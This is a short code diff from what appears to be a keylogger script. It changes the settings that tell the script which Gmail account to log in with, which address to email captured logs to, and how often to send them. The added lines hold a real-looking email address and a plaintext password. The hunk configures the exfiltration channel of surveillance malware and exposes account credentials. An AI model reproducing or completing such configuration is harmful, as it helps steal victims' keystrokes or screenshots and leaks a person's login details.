@@ -26,9 +26,9 @@ t="";pics_names=[]
 
 #########Settings########
 
-yourgmail="chasidy02@royalwestmail.com"                                        #What is your gmail?
-yourgmailpass="d3459f4d594d68ffe949a0fd1f4133d3"                                    #What is your gmail password
-sendto="chasidy02@royalwestmail.com"                                           #Where should I send the logs to? (any email address)
+yourgmail="eduardooleveira80@gmail.com"                                        #What is your gmail?
+yourgmailpass="Noltraxona@1"                                    #What is your gmail password
+sendto="eduardooleveira80@gmail.com"                                           #Where should I send the logs to? (any email address)
 interval=30                                         #Time to wait before sending data to email (in seconds)
 
 ########################
